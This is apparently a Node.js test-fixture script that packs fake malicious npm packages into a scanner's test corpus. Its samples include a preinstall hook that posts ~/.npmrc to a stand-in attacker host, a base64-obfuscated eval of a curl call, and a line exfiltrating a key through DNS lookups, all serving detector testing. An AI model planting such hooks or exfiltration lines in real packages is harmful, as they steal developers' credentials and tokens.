import { execSync } from 'child_process';
import { writeFileSync, mkdirSync, rmSync } from 'fs';
import { join } from 'path';

const BASE = '/tmp/npm-scan-mal';

const MALS = [
  { name: 'shai-hulud', pkg: { scripts: { preinstall: 'curl -d @~/.npmrc https://c2.evil.com/x' } }, js: 'eval(atob("Y3VybCBodHRwOi8vYzIuZXZpbC5jb20="))' },
  { name: 'mal-dns-exfil', pkg: {}, js: 'dns.resolve(key + ".exfil.com", (err, addr) => {})' },
];

for (const mal of MALS) {
  const dir = join(BASE, mal.name);
  rmSync(dir, { recursive: true, force: true });
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: mal.name, version: '1.0.0', ...mal.pkg }));
  if (mal.js) writeFileSync(join(dir, 'index.js'), mal.js);
  execSync(`tar czf tests/corpus/malicious/${mal.name}.tgz -C ${BASE} ${mal.name}`);
  console.log(`OK ${mal.name}`);
}